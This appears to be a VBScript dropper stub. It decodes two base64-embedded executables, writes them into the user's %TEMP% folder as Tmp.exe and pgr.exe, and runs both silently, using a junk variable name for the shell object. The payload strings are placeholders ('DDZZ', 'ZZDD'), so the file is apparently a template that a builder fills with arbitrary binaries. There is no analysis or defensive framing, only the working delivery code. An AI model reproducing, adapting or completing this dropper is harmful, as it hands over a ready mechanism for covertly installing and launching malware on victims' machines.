Dim shadow,devpoint,members,ramadan

Dim ShaDev
set hfhejotgbhzlzyohafchtul = createobject("wscript.shell")
ShaDev = hfhejotgbhzlzyohafchtul.ExpandEnvironmentStrings("%TEMP%")

Set shadow=CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
Set members=CreateObject("Msxml2.DOMDocument.3.0").CreateElement("base64")
shadow.dataType="bin.base64"
members.dataType="bin.base64"
'--------------------------------

shadow.text="DDZZ"

members.text= "ZZDD"

'--------------------------------

Set devpoint=CreateObject("ADODB.Stream")
Set ramadan=CreateObject("ADODB.Stream")
devpoint.Type=1
ramadan.Type=1
devpoint.Open
ramadan.Open
devpoint.Write shadow.nodeTypedValue
ramadan.Write members.nodeTypedValue
devpoint.SaveToFile ShaDev & "\Tmp.exe",2
ramadan.SaveToFile ShaDev & "\pgr.exe",2
hfhejotgbhzlzyohafchtul.run(ShaDev & "\Tmp.exe")
wscript.sleep(2000)
hfhejotgbhzlzyohafchtul.run(ShaDev & "\pgr.exe")